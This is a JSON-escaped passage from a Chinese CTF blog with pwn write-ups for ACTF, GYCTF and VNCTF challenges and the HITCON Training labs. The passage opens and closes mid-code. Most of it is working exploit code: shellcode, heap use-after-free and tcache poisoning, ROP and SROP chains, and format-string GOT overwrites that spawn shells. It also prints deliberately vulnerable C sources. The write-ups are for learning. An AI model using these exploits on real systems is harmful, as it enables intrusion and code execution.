\u0026#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#39; sla(\u0026#39;peat?\\n\u0026#39;,\u0026#39;-1\u0026#39;) addr = int(r(8),16) payload = shellcode.ljust(0x41b+4,\u0026#39;a\u0026#39;)+p32(addr) sa(\u0026#39;\\n\u0026#39;,payload) babyheap # uaf 覆盖打印函数为 system，内容为 /bin/sh。\ndef add(size,content=\u0026#39;a\u0026#39;): sla(\u0026#39;:\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;size: \\n\u0026#39;,str(size)) sa(\u0026#39;content: \\n\u0026#39;,content) def free(index): sla(\u0026#39;:\u0026#39;,\u0026#39;2\u0026#39;) sla(\u0026#39;index: \\n\u0026#39;,str(index)) def show(index): sla(\u0026#39;:\u0026#39;,\u0026#39;3\u0026#39;) sla(\u0026#39;index: \\n\u0026#39;,str(index)) add(0x20) # 0 add(0x20) # 1 free(0) free(1) binsh = 0x602010 add(0x10,flat(binsh,elf.plt[\u0026#39;system\u0026#39;])) # 2 show(0) message # 利用 double free 欺骗 malloc 分配一个位于 bss 段的 chunk，使得我们可以控制全局数组，从而修改 0 号堆块的内容。然后先泄露 libc 再劫持 __free_hook 到 system 即可。需要注意 fastbin 的大小检查。\ndef add(size,content=\u0026#39;a\u0026#39;): sla(\u0026#39;:\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;:\\n\u0026#39;,str(size)) sa(\u0026#39;:\\n\u0026#39;,content) def free(index): sla(\u0026#39;:\u0026#39;,\u0026#39;2\u0026#39;) sla(\u0026#39;:\\n\u0026#39;,str(index)) def edit(index,content): sla(\u0026#39;:\u0026#39;,\u0026#39;3\u0026#39;) sla(\u0026#39;:\\n\u0026#39;,str(index)) sa(\u0026#39;:\\n\u0026#39;,content) def show(index): sla(\u0026#39;:\u0026#39;,\u0026#39;4\u0026#39;) sla(\u0026#39;:\\n\u0026#39;,str(index)) add(0x50) # 0 add(0x40) # 1 add(0x40) # 2 free(1) free(2) free(1) fake = 0x602060-0x8 add(0x40,p64(fake)) # 3 \u0026lt;-\u0026gt; 1 add(0x40) # 4 \u0026lt;-\u0026gt; 2 add(0x40) # 5 \u0026lt;-\u0026gt; 1 add(0x40,p64(elf.got[\u0026#39;puts\u0026#39;])) # 6 \u0026lt;-\u0026gt; fake show(0) ru(\u0026#39;:\u0026#39;) puts = uu64(r(6)) libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts) base = puts - libc.dump(\u0026#39;puts\u0026#39;) system = base + libc.dump(\u0026#39;system\u0026#39;) free_hook = base + libc.dump(\u0026#39;__free_hook\u0026#39;) edit(6,p64(free_hook)) edit(0,p64(system)) add(0x8,\u0026#39;/bin/sh\\x00\u0026#39;) # 7 free(7) GYCTF 2020 # borrowstack # 用 leave_ret 栈迁移到 bss 段，需要注意的是栈从高地址向低地址生长，需要留足够的 offset 确保迁移之后填的 payload 不会覆盖到下面的 got 表。我直接把 payload 长度加起来留了一些余量作为 offset，实际上这里的 offset 甚至可以爆破出来。\nleave_ret = 0x400699 bank = 0x601080 pop_rdi = 0x400703 offset = 0xa0 payload = flat(\u0026#39;a\u0026#39;*0x60,bank+offset,leave_ret) sa(\u0026#39;want\\n\u0026#39;,payload) payload = flat(\u0026#39;a\u0026#39;*offset,bank+offset,pop_rdi,elf.got[\u0026#39;puts\u0026#39;],elf.plt[\u0026#39;puts\u0026#39;],elf.sym[\u0026#39;main\u0026#39;]) sa(\u0026#39;now!\\n\u0026#39;,payload) base = uu64(r(6)) - libc.sym[\u0026#39;puts\u0026#39;] leak(\u0026#39;base\u0026#39;,base) one = base + 0x4526a payload = flat(\u0026#39;a\u0026#39;*0x60,\u0026#39;a\u0026#39;*8,one) sa(\u0026#39;want\\n\u0026#39;,payload) sa(\u0026#39;now!\\n\u0026#39;,\u0026#39;a\u0026#39;) some_thing_exceting # 每次申请创建三个堆块，其中一个是结构体指针两个是字符串。而释放时没有置 NULL，利用 double free 就可以修改其中一个字符串 chunk 的 fd 指针，指向已经在 bss 段上的 flag。不过对应位置的伪造 size 字段为 0x60，因此为了通过 fastbin 检查需要使用 0x50 的字符串 chunk。\nflag = 0x6020a8 add(0x60,0x50) add(0x60,0x50) add(0x60,0x50) free(0) free(1) free(0) add(0x50,0x50,p64(flag-0x10)) add(0x50,0x50) show(1) some_thing_interesting # 和上题不同的是没有 flag 在 bss 段了，但是多出了一个检查 code 的选项，该函数内存在格式化字符串漏洞。测出偏移为 17，泄露 libc。\n随后，由于本题的 edit 函数是可以用的，我们不需要 double free 了，直接 uaf 就可以修改 __malloc_hook 为 one_gadget 了。\ncode = \u0026#39;OreOOrereOOreO\u0026#39; sla(\u0026#39;:\u0026#39;,code+\u0026#39;%17$p\u0026#39;) sla(\u0026#39;:\u0026#39;,\u0026#39;0\u0026#39;) ru(code) base = int(ru(\u0026#39;\\n\u0026#39;),16) - 0x20830 leak(\u0026#39;base\u0026#39;,base) add(0x60,0x60) add(0x60,0x60) free(1) free(2) edit(1,p64(base+libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x23)) add(0x60,0x60) add(0x60,0x60) edit(4,\u0026#39;a\u0026#39;*0x13+p64(base+0xf1147)) sla(\u0026#39;:\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;:\u0026#39;,str(0x60)) 两道 something 似乎改编自 ACTF2020 的两道 SCP Foundation。\nsignin # 程序分配的块大小固定为 0x70，最多申请 9 个；edit 功能只能用一次，不过并没有检查 chunk 是否是 free 的；delete 检查了 chunk 是否为 free，并且释放之后将 chunk 对应的 flag 标记为 free，因此无法 double free，不过指针依然没有置 NULL。\n此外还存在后门函数，先 calloc(1,0x70)，然后如果全局变量 ptr 不为空就能 getshell。题目环境为 Ubuntu 18，那么思路就是利用 tcache 机制。先填满 tcache，随后对 tcache 中第一个 chunk 投毒，即修改 fd 指向 ptr 上方的 fake chunk，然后申请出一块 tcache chunk，此时 fake chunk 就会进入 tcache 中。再申请一次即可 getshell。\nfor i in range(8): add(i) for i in range(8): free(i) dbg() edit(7,p64(0x4040c0-0x10)) add(8) dbg() sla(\u0026#39;?\u0026#39;,\u0026#39;6\u0026#39;) dbg() force # 程序没有对申请的大小进行检查，结合题目名可以想到 House of Force。先申请一个很大的 chunk 紧挨着 libc，可以泄露出 libc。这里的偏移是通过 gdb 调试得到的，将题目给出的地址和 libc_base 进行 distance 即可。随后修改 top chunk 大小同时泄露堆地址。这样 top chunk 地址也得到了。\n接下来，我使用 pwngdb 工具，调试的时候先查看 heapbase，然后把这个地址作为参数传给 force 命令，即可得到 nb=-48，从而算出 evil_size 为 malloc_hook-top-0x30。申请一个 evil_size 大小的 chunk，然后再申请就能得到 __malloc_hook 附近的 chunk，由于 one_gadget 条件不满足，这里借用了 realloc 去覆盖 __malloc_hook。\ndistance = 0x5b2010 base = add(0x20000)-distance leak(\u0026#39;base\u0026#39;,base) heap = add(0x10,\u0026#39;\\x00\u0026#39;*0x18+p64(0xffffffffffffffff))-0x10 leak(\u0026#39;heap\u0026#39;,heap) top = heap+0x20 malloc_hook = base+libc.sym[\u0026#39;__malloc_hook\u0026#39;] one = base+0x4526a realloc = base+libc.sym[\u0026#39;realloc\u0026#39;] # force heapbase evil = malloc_hook-top-0x30 add(evil) payload = flat(\u0026#39;a\u0026#39;*8,one,realloc+4) add(len(payload),payload) sla(\u0026#39;puts\\n\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;size\\n\u0026#39;,str(0x10)) 需要注意远程的 chunk 到 libc 偏移量与本地不同，但是不能通过调试得到。此时可以爆破该偏移，又由于 ASLR 不改变低 12 位，只需要步长为 0x1000。\nbf_note # 本题关键在于读取 title 长度时对长度进行了限制，但是后面用的时候依然用的是第一次输入的没有经过限制的长度变量。此外，在读入 description 和 postscript 时存在栈溢出。\n接下来的步骤对我而言属于新姿势，而 原 writeup 写得挺详细了，建议参考。\ndocument # 本题存在明显的 uaf 漏洞，关键在于通过逆向弄清结构体的结构：\n----------------------- | prev_size | size=0x21 | ----------------------- -- | ptr | sex=1 | | ----------------------- | | prev_size | size=0x91 | | ----------------------- --\u0026gt; | name | sex=1 | ----------------------- | | | information | | | ----------------------- 那么我们利用的思路就很简单了，首先由于 information 所在的 chunk 固定申请 0x80，也就是实际 0x90 大小，我们可以释放掉一块来泄露 libc。然后新申请的 0x20 堆块都会从从释放的这块中切割，这样只需要在 ptr 里写入 free_hook-0x10，那么在编辑 information 时，free_hook 就落在了图中的 information 位置，我们写上 system 即可。\nadd(\u0026#39;/bin/sh\\x00\u0026#39;) # 0 add() # 1 add() # 2 free(1) show(1) ru(\u0026#39;\\n\u0026#39;) base = uu64(r(6))-88-libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x10 leak(\u0026#39;base\u0026#39;,base) free_hook = base+libc.sym[\u0026#39;__free_hook\u0026#39;] system = base+libc.sym[\u0026#39;system\u0026#39;] add() # 3 add() # 4 edit(1,flat(0,0x21,free_hook-0x10,1)+p64(0)*10) edit(4,p64(system)+p64(1)+p64(0)*12) free(0) VNCTF 2020 # 第一次见到堆题比栈题解答人数还多的比赛。\nsimpleHeap # 编辑时存在 off by one，可以修改下一个 chunk 的大小后令其进入 unsorted bin 泄露 libc。然后修改 malloc_hook 为 one_gadget，注意需要通过 realloc 调整 rsp 来满足 one_gadget 条件。\nadd(0x18) # 0 add(0x68) # 1 add(0x68) # 2 add(0x18) # 3 edit(0,\u0026#39;a\u0026#39;*0x18+\u0026#39;\\xe1\u0026#39;) free(1) add(0x68) # 1 show(2) base = uu64(r(6))-88-libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x10 leak(\u0026#39;base\u0026#39;,base) malloc_hook = base+libc.sym[\u0026#39;__malloc_hook\u0026#39;] add(0x60) # 4 \u0026lt;-\u0026gt; 2 free(3) free(2) edit(4,p64(malloc_hook-0x23)+\u0026#39;\\n\u0026#39;) add(0x60) add(0x60,flat(\u0026#39;a\u0026#39;*11,base+0x4526a,base+libc.sym[\u0026#39;realloc\u0026#39;]+13)) sla(\u0026#39;:\u0026#39;,str(_add)) sla(\u0026#39;?\u0026#39;,str(0x18)) easyTHeap # free 时指针未置 NULL。先利用 tcache double free 泄露堆地址，随后 tcache 投毒拿到 tcache_perthread_struct，修改 count 令 tcache 全被填满，再次 free 时就会进入 unsorted bin 泄露 libc。接下来依然是覆盖 malloc_hook 为 one_gadget 以及通过 realloc 调整 rsp，不过由于环境是 2.27，one_gadget、偏移量等等都会会有所不同，unsorted bin 泄露的地址也变成了 main_arena+96 而非 +88。\nadd(0x80) # 0 add(0x80) # 1 free(0) free(0) show(0) heap = uu64(r(6))-0x260 leak(\u0026#39;heap\u0026#39;,heap) tps = heap+0x10 add(0x80) # 2 \u0026lt;-\u0026gt; 0 edit(2,p64(tps)) add(0x80) # 3 \u0026lt;-\u0026gt; 1 add(0x80) # 4 \u0026lt;-\u0026gt; tps edit(4,\u0026#39;\\x07\u0026#39;*8+\u0026#39;\\x00\u0026#39;*0x70+p64(tps+0x78)) free(0) show(0) base = uu64(r(6))-0x60-libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x10 leak(\u0026#39;base\u0026#39;,base) one = base+0x10a38c malloc_hook = base+libc.sym[\u0026#39;__malloc_hook\u0026#39;] edit(4,\u0026#39;\\x07\u0026#39;*8+\u0026#39;\\x00\u0026#39;*0x70+p64(malloc_hook-0x8)) add(0x80) # 5 edit(5,flat(one,base+libc.sym[\u0026#39;realloc\u0026#39;]+4)) sla(\u0026#39;:\u0026#39;,str(_add)) sla(\u0026#39;?\u0026#39;,str(0x10)) warmup # 只能溢出 0x10 字节，但是上一个栈帧的 buf 空间较大且可控，因此可以多 ret 一次回到上一个栈帧的 buf 里构造 ROP 链。此外，程序开启了 seccomp 沙箱禁止 execve，因此我们只能构造 ORW 读 flag。幸运的是题目直接给了 puts 地址，可以得到 libc 地址从而使用 libc 的 gadgets，而 ORW 使用的缓冲区也可以利用 libc 的 rw 段。\nru(\u0026#39;0x\u0026#39;) puts = int(ru(\u0026#39;\\n\u0026#39;),16) base = puts-libc.sym[\u0026#39;puts\u0026#39;] leak(\u0026#39;base\u0026#39;,base) pop_rdi = base+0x21102 pop2 = base+0x1150c9 # rdx,rsi ret = base+0x937 open = base+libc.sym[\u0026#39;open\u0026#39;] read = base+libc.sym[\u0026#39;read\u0026#39;] buf = base+libc.sym[\u0026#39;_IO_2_1_stderr_\u0026#39;] chain = [ # read(0,buf,8) pop_rdi,0,pop2,8,buf,read, # open(buf,0,0) pop_rdi,buf,pop2,0,0,open, # read(3,buf,0x100) pop_rdi,3,pop2,0x100,buf,read, # puts(buf) pop_rdi,buf,puts ] sa(\u0026#39;thing:\u0026#39;,flat(chain)) payload = flat(\u0026#39;a\u0026#39;*0x70,\u0026#39;a\u0026#39;*8,ret) sa(\u0026#39;name?\u0026#39;,payload) s(\u0026#39;/flag\\x00\\x00\\x00\u0026#39;) babybabypwn_1 # 看到程序主动调用 syscall(15,\u0026amp;buf) 可知是 SROP，我们需要在 buf 里放伪造的 Sigreturn Frame，然后程序就会调用 rt_sigreturn 恢复我们伪造的 frame。同样开启了沙箱，依然是构造 ORW 读 flag。\n这里在使用 pwnlib.rop.srop 模块时，用 SigreturnFrame 构造时出现了一些问题，暂时还不清楚原因，使用了手动构造 frame 的办法。\nru(\u0026#39;0x\u0026#39;) puts = int(ru(\u0026#39;\\n\u0026#39;),16) base = puts-libc.sym[\u0026#39;puts\u0026#39;] leak(\u0026#39;base\u0026#39;,base) pop_rdi = base+0x21102 pop2 = base+0x1150c9 syscall = base+libc.sym[\u0026#39;syscall\u0026#39;] open = base+libc.sym[\u0026#39;open\u0026#39;] read = base+libc.sym[\u0026#39;read\u0026#39;] buf = base+0x3c6500 frame = p64(0) * 12 frame += p64(0) # rdi frame += p64(0) # rsi frame += p64(0) # rbp frame += p64(0) # rbx frame += p64(buf-0x10) # rdx frame += p64(0) # rax frame += p64(0x100) # rcx frame += p64(buf) # rsp frame += p64(syscall) # rip frame += p64(0) # eflags frame += p64(0x33) # cs/fs/gs frame += p64(0)*7 sa(\u0026#39;message:\u0026#39;,frame) chain = [ \u0026#39;/flag\\x00\\x00\\x00\u0026#39;,0, # open(buf-0x10,0,0) pop_rdi,buf-0x10,pop2,0,0,open, # read(3,buf+0x100,0x100) pop_rdi,3,pop2,0x100,buf+0x100,read, # puts(buf+0x100) pop_rdi,buf+0x100,puts ] s(flat(chain)) 更新：参考 AiDai 师傅的方法，可以自动构造 frame，并且不需要系统调用：\nru(\u0026#39;0x\u0026#39;) puts = int(ru(\u0026#39;\\n\u0026#39;),16) base = puts-libc.sym[\u0026#39;puts\u0026#39;] leak(\u0026#39;base\u0026#39;,base) pop_rdi = base+0x21102 pop2 = base+0x1150c9 open = base+libc.sym[\u0026#39;open\u0026#39;] read = base+libc.sym[\u0026#39;read\u0026#39;] buf = base+libc.bss() frame = SigreturnFrame() frame.rdi = 0 frame.rsi = buf frame.rdx = 0x100 frame.rsp = buf frame.rip = read sa(\u0026#39;message:\u0026#39;,str(frame)[8:]) chain = [ # read(0,buf,0x100) pop_rdi,0,pop2,0x100,buf,read, # open(buf,0,0) pop_rdi,buf,pop2,0,0,open, # read(3,buf,0x100) pop_rdi,3,pop2,0x100,buf,read, # puts(buf) pop_rdi,buf,puts ] s(flat(chain)) s(\u0026#39;/flag\\x00\u0026#39;) ","date":"2020-03-01","permalink":"/posts/recent-pwn-medium/","section":"Posts","summary":"\u003cp\u003e难题都没有做出来。题目来自 ACTF 2019、GYCTF 2019、VNCTF 2020。\u003c/p\u003e","title":"近期进阶 Pwn 合集"},{"content":"HITCON Training 更新完成，没咕咕。其中堆题真是很适合入门。\nlab1 - sysmagic # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void get_flag(){ int fd ; int password; int magic ; char key[] =\u0026#34;Do_you_know_why_my_teammate_Orange_is_so_angry???\u0026#34;; char cipher[] = {7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66}; fd = open(\u0026#34;/dev/urandom\u0026#34;,0); read(fd,\u0026amp;password,4); printf(\u0026#34;Give me maigc :\u0026#34;); scanf(\u0026#34;%d\u0026#34;,\u0026amp;magic); if(password == magic){ for(int i = 0 ; i \u0026lt; sizeof(cipher) ; i++){ printf(\u0026#34;%c\u0026#34;,cipher[i]^key[i]); } } } int main(){ setvbuf(stdout,0,2,0); get_flag(); return 0 ; } /dev/urandom 的随机数是很难预测的，因此我们只能想办法让 if 条件判断失效。可以用 IDA 将对应的 jnz 语句 patch 成 jz 就可以打印 flag 了。当然也可以 gdb 设置 eip 跳过这个 jnz。\nlab2 - orw # 本题没有提供源码。开了 seccomp 沙箱，只能用 orw 写 shellcode，题目会自动执行写入的 shellcode。\nfrom pwn import * binary = \u0026#39;./orw.bin\u0026#39; context.binary = binary p = process(binary) shellcode = shellcraft.open(\u0026#39;/flag\u0026#39;,0) + shellcraft.read(\u0026#39;eax\u0026#39;,\u0026#39;esp\u0026#39;,100) + shellcraft.write(1,\u0026#39;esp\u0026#39;,100) p.sendlineafter(\u0026#39;:\u0026#39;,asm(shellcode)) p.interactive() lab3 - ret2sc # 源码：\n#include \u0026lt;stdio.h\u0026gt; char name[50]; int main(){ setvbuf(stdout,0,2,0); printf(\u0026#34;Name:\u0026#34;); read(0,name,50); char buf[20]; printf(\u0026#34;Try your best:\u0026#34;); gets(buf); return ; } 没有开启 NX，因此第一次输入可以输入 shellcode 放在 bss 段，第二次输入栈溢出返回到 shellcode 所在地址。\nfrom pwn import * binary = \u0026#39;./ret2sc\u0026#39; context.binary = binary p = process(binary) name = 0x804a060 p.sendlineafter(\u0026#39;:\u0026#39;,asm(shellcraft.sh())) p.sendlineafter(\u0026#39;:\u0026#39;,flat(\u0026#39;a\u0026#39;*32,name)) p.interactive() lab4 - ret2lib # 源码：\n#include \u0026lt;stdio.h\u0026gt; void See_something(unsigned int addr){ int *address ; address = (int *)addr ; printf(\u0026#34;The content of the address : %p\\n\u0026#34;,*address); }; void Print_message(char *mesg){ char buf[48]; strcpy(buf,mesg); printf(\u0026#34;Your message is : %s\u0026#34;,buf); } int main(){ char address[10] ; char message[256]; unsigned int addr ; puts(\u0026#34;###############################\u0026#34;); puts(\u0026#34;Do you know return to library ?\u0026#34;); puts(\u0026#34;###############################\u0026#34;); puts(\u0026#34;What do you want to see in memory?\u0026#34;); printf(\u0026#34;Give me an address (in dec) :\u0026#34;); fflush(stdout); read(0,address,10); addr = strtol(address); See_something(addr) ; printf(\u0026#34;Leave some message for me :\u0026#34;); fflush(stdout); read(0,message,256); Print_message(message); puts(\u0026#34;Thanks you ~\u0026#34;); return 0 ; } 经典的 ret2libc 题目，第一次输入可以直接泄露 GOT 地址，第二次栈溢出返回到 system(\u0026quot;/bin/sh\u0026quot;)。\nsla(\u0026#39;:\u0026#39;,elf.got[\u0026#39;puts\u0026#39;]) ru(\u0026#39;0x\u0026#39;) puts = int(ru(\u0026#39;\\n\u0026#39;),16) base,libc,system = leak_libc(\u0026#39;puts\u0026#39;,puts) binsh = base+libc.dump(\u0026#39;str_bin_sh\u0026#39;) sla(\u0026#39;:\u0026#39;,flat(\u0026#39;a\u0026#39;*60,system,\u0026#39;a\u0026#39;*4,binsh)) lab5 - simplerop # 源码：\n#include \u0026lt;stdio.h\u0026gt; int main(){ char buf[20]; puts(\u0026#34;ROP is easy is\u0026#39;nt it ?\u0026#34;); printf(\u0026#34;Your input :\u0026#34;); fflush(stdout); read(0,buf,100); } 程序是静态链接的，其中有很多 gadgets 但没有 /bin/sh，因此我们需要自己写到 bss 段上去，然后 ret2syscall。\nread = 0x806cd50 pop_eax = 0x80bae06 pop_dcb = 0x806e850 int_80 = 0x80493e1 chain = [ \u0026#39;a\u0026#39;*32, # read(0,bss,8) read,pop_dcb,0,elf.bss(),8, # execve(\u0026#39;/bin/sh\u0026#39;,0,0) pop_dcb,0,0,elf.bss(),pop_eax,0xb,int_80 ] sla(\u0026#39;:\u0026#39;,flat(chain)) s(\u0026#39;/bin/sh\\x00\u0026#39;) lab6 - migration # 源码：\n#include \u0026lt;stdio.h\u0026gt; int count = 1337 ; int main(){ if(count != 1337) _exit(1); count++; char buf[40]; setvbuf(stdout,0,2,0); puts(\u0026#34;Try your best :\u0026#34;); read(0,buf,64); return ; } 设置了 count 使得 main 不能执行第二次。这导致我们无法直接实现 ret2libc，同时栈溢出的空间较小，放不下 ROP 链，因此考虑栈迁移。\n首先通过 read 读取泄露 libc 的 ROP 链到 buf，然后 leave_ret 迁移到 buf。继续 read 读取 system(\u0026quot;/bin/sh\u0026quot;) 的 ROP 链到 fub，然后 leave_ret 迁移到 fub。\nbuf = elf.bss()+0x300 fub = elf.bss()+0x400 leave_ret = 0x8048418 pop3 = 0x8048569 pop_ebx = 0x804836d payload = flat(\u0026#39;a\u0026#39;*0x28,buf,elf.plt[\u0026#39;read\u0026#39;],leave_ret,0,buf,0x100) sa(\u0026#39;:\\n\u0026#39;,payload) payload = flat(fub,elf.plt[\u0026#39;puts\u0026#39;],pop_ebx,elf.got[\u0026#39;puts\u0026#39;],elf.plt[\u0026#39;read\u0026#39;],leave_ret,0,fub,0x100) s(payload) puts = u32(r(4)) base,libc,system = leak_libc(\u0026#39;puts\u0026#39;,puts) binsh = base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*4,system,\u0026#39;a\u0026#39;*4,binsh) s(payload) lab7 - crack # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; unsigned int password ; int main(){ setvbuf(stdout,0,2,0); char buf[100]; char input[16]; int fd ; srand(time(NULL)); fd = open(\u0026#34;/dev/urandom\u0026#34;,0); read(fd,\u0026amp;password,4); printf(\u0026#34;What your name ?\u0026#34;); read(0,buf,99); printf(\u0026#34;Hello ,\u0026#34;); printf(buf); printf(\u0026#34;Your password :\u0026#34;); read(0,input,15); if(atoi(input) != password){ puts(\u0026#34;Goodbyte\u0026#34;); }else{ puts(\u0026#34;Congrt!!\u0026#34;); system(\u0026#34;cat /home/crack/flag\u0026#34;); } } 存在格式化字符串漏洞，考虑利用该漏洞修改 password 为确定的值，然后输入该值即可。\ndef exec_fmt(payload): io = process(binary) io.sendlineafter(\u0026#39;?\u0026#39;,payload) io.recvuntil(\u0026#39;Hello ,\u0026#39;) info = io.recvline() io.close() return info auto = FmtStr(exec_fmt) password = 0x804a048 payload = fmtstr_payload(auto.offset,{password:1234}) sla(\u0026#39;?\u0026#39;,payload) sla(\u0026#39;:\u0026#39;,1234) lab8 - craxme # 源码：\n#include \u0026lt;stdio.h\u0026gt; int magic = 0 ; int main(){ char buf[0x100]; setvbuf(stdout,0,2,0); puts(\u0026#34;Please crax me !\u0026#34;); printf(\u0026#34;Give me magic :\u0026#34;); read(0,buf,0x100); printf(buf); if(magic == 0xda){ system(\u0026#34;cat /home/craxme/flag\u0026#34;); }else if(magic == 0xfaceb00c){ system(\u0026#34;cat /home/craxme/craxflag\u0026#34;); }else{ puts(\u0026#34;You need be a phd\u0026#34;); } } 同样是格式化字符串漏洞，存在两种利用方法。一种是直接覆盖 magic 满足条件：\ndef exec_fmt(payload): io = process(binary) io.sendlineafter(\u0026#39;:\u0026#39;,payload) info = io.recvline() io.close() return info auto = FmtStr(exec_fmt) magic = 0x804a038 payload = fmtstr_payload(auto.offset,{magic:0xda}) sla(\u0026#39;:\u0026#39;,payload) 另一种是用 main 中的 read 开始的语句覆盖 puts，然后用 system 覆盖 printf 来拿到 shell。\nmain_read = 0x804859b payload = fmtstr_payload(auto.offset,{elf.got[\u0026#39;puts\u0026#39;]:main_read,elf.got[\u0026#39;printf\u0026#39;]:elf.plt[\u0026#39;system\u0026#39;]}) sla(\u0026#39;:\u0026#39;,payload) sl(\u0026#39;/bin/sh\u0026#39;) lab9 - playfmt # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; char buf[200] ; void do_fmt(){ while(1){ read(0,buf,200); if(!strncmp(buf,\u0026#34;quit\u0026#34;,4)) break; printf(buf); } return ; } void play(){ puts(\u0026#34;=====================\u0026#34;); puts(\u0026#34; Magic echo Server\u0026#34;); puts(\u0026#34;=====================\u0026#34;); do_fmt(); return; } int main(){ setvbuf(stdout,0,2,0); play(); return; } 本题依然是格式化字符串漏洞，但问题在于这次并不会将数据读入栈上，而是读入 bss 段。这使得常规 fsb 利用方式失效，但是我们依然可以通过修改 saved ebp 来达到任意地址读写。\n在 printf 前查看栈情况：\n00:0000│ esp 0xffffcd60 —▸ 0x804a060 (buf) ◂— \u0026#39;aaaa\\n\u0026#39; 01:0004│ 0xffffcd64 —▸ 0x8048640 ◂— jno 0x80486b7 /* \u0026#39;quit\u0026#39; */ 02:0008│ 0xffffcd68 ◂— 0x4 03:000c│ 0xffffcd6c —▸ 0x804857c (play+51) ◂— add esp, 0x10 04:0010│ 0xffffcd70 —▸ 0x8048645 ◂— cmp eax, 0x3d3d3d3d 05:0014│ 0xffffcd74 —▸ 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 06:0018│ ebp 0xffffcd78 —▸ 0xffffcd88 —▸ 0xffffcd98 ◂— 0x0 07:001c│ 0xffffcd7c —▸ 0x8048584 (play+59) ◂— nop 08:0020│ 0xffffcd80 —▸ 0xf7fb6d60 (_IO_2_1_stdout_) ◂— 0xfbad2887 09:0024│ 0xffffcd84 ◂— 0x0 0a:0028│ 0xffffcd88 —▸ 0xffffcd98 ◂— 0x0 0b:002c│ 0xffffcd8c —▸ 0x80485b1 (main+42) ◂— nop 0c:0030│ 0xffffcd90 —▸ 0xf7fb63dc (__exit_funcs) —▸ 0xf7fb71e0 (initial) ◂— 0x0 可以看到 saved ebp 在 6$ 位置，它实际上指向位于 10$ 的 0xffffcd88。也就是说，如果我们能通过 %n 修改 saved ebp，实际上就能修改 10$ 的位置。\n然而，10$ 这个位置同样可以是一个指针。同理我们也可以 %n 修改 10$ 指向的地址。除了修改，我们同样可以泄露，那么自然想到泄露 libc 函数的 GOT 地址，再覆盖成 system 的做法。\n因此思路如下，记栈上偏移为 10 的地址为 ebp2，偏移为 7 和 11 的地址分别为 s7 和 s11。\n通过 ebp 修改 ebp2 指向 s7 通过 ebp2 将 s7 覆盖为 printf@got 通过 ebp 修改 ebp2 指向 s11 通过 ebp2 将 s11 覆盖为 printf@got+2 通过 %7$s 泄露 s7 处的 printf@got，从而泄露 libc 用 system@plt 低 2 字节覆盖 s7 处的 printf@got 用 system@plt 高 2 字节覆盖 s11 处的 printf@got+2 输入 /bin/sh\\x00，调用 printf(\u0026quot;/bin/sh\u0026quot;) 即 getshell 当然也可以 4 字节直接写，但是由于字符数过多会导致速度非常慢，不推荐。此外，需要注意即使是 2 字节写依然会有延迟，需要多次 recv() 接收返回的字符串，直到发送的特殊字符串能够收到为止，算是 fsb 利用时的一个小技巧。\nhn = lambda addr,offset: \u0026#39;%{}c%{}$hn\u0026#39;.format(addr,offset) def delay(): while True: sl(\u0026#39;delay\u0026#39;) sleep(0.2) data = r() if data.find(\u0026#39;delay\u0026#39;) != -1: break for i in range(3): ru(\u0026#39;\\n\u0026#39;) sl(\u0026#39;%6$p\u0026#39;) ebp2 = int(ru(\u0026#39;\\n\u0026#39;),16) ebp = ebp2-0x10 s7 = ebp2-0xc s11 = ebp2+4 mask = 0xffff printf = elf.got[\u0026#39;printf\u0026#39;] sl(hn(s7\u0026amp;mask,6)) sl(hn(printf\u0026amp;mask,10)) delay() sl(hn(s11\u0026amp;mask,6)) sl(hn((printf+2)\u0026amp;mask,10)) delay() sl(\u0026#39;aaaa%7$s\u0026#39;) ru(\u0026#39;aaaa\u0026#39;) printf = u32(r(4)) leak(\u0026#39;printf\u0026#39;,printf) base,libc,system = leak_libc(\u0026#39;printf\u0026#39;,printf) sl(hn(system\u0026amp;mask,7)+hn((system\u0026gt;\u0026gt;16)-(system\u0026amp;mask),11)) delay() sl(\u0026#39;/bin/sh\\x00\u0026#39;) lab10 - hacknote # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; struct note { void (*printnote)(); char *content ; }; struct note *notelist[5]; int count = 0; void print_note_content(struct note *this){ puts(this-\u0026gt;content); } void add_note(){ int i ; char buf[8]; int size ; if(count\u0026gt; 5){ puts(\u0026#34;Full\u0026#34;); return ; } for(i = 0 ; i \u0026lt; 5 ; i ++){ if(!notelist[i]){ notelist[i] = (struct note*)malloc(sizeof(struct note)); if(!notelist[i]){ puts(\u0026#34;Alloca Error\u0026#34;); exit(-1); } notelist[i]-\u0026gt;printnote = print_note_content; printf(\u0026#34;Note size :\u0026#34;); read(0,buf,8); size = atoi(buf); notelist[i]-\u0026gt;content = (char *)malloc(size); if(!notelist[i]-\u0026gt;content){ puts(\u0026#34;Alloca Error\u0026#34;); exit(-1); } printf(\u0026#34;Content :\u0026#34;); read(0,notelist[i]-\u0026gt;content,size); puts(\u0026#34;Success !\u0026#34;); count++; break; } } } void del_note(){ char buf[4]; int idx ; printf(\u0026#34;Index :\u0026#34;); read(0,buf,4); idx = atoi(buf); if(idx \u0026lt; 0 